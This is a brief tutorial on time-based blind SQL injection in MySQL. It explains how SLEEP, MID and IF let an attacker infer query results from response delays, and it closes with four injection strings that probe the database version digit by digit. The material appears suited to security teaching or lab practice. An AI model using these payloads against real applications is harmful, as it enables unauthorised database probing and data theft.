Time Based SQL Injection:

Sometimes the attacker might not be able to identify the query execution success, because the server/application doesnâ€™t show any error.
One of the techniques to get an indication for the query execution success called Time-Based Blind SQL Injection.
 
With this technique, the attacker executes functions that take some time to finish (for example: Sleep, Delay, etc.). By measuring the time took the application to response, the attacker might be able to identify if the query executed successfully or the query execution failed.

Function we will be using 
SLEEP : SLEEP(time) <-- syntax
Only available since MySQL 5. It takes a number of seconds to wait in parameter.
MID(string, start, length)

Condition we will be using
IF(condition, when_true, when_false)
Only valid when using in SQL statement. 




Commands to Execute:
		 1' -sleep(10)#
1' -if(mid(version(),1,1)='5',sleep(3),0)#
		 1' -if(mid(version(),1,1)='8',sleep(3),0)#
		 1' -if(mid(version(),1,1)='1',sleep(3),0)#
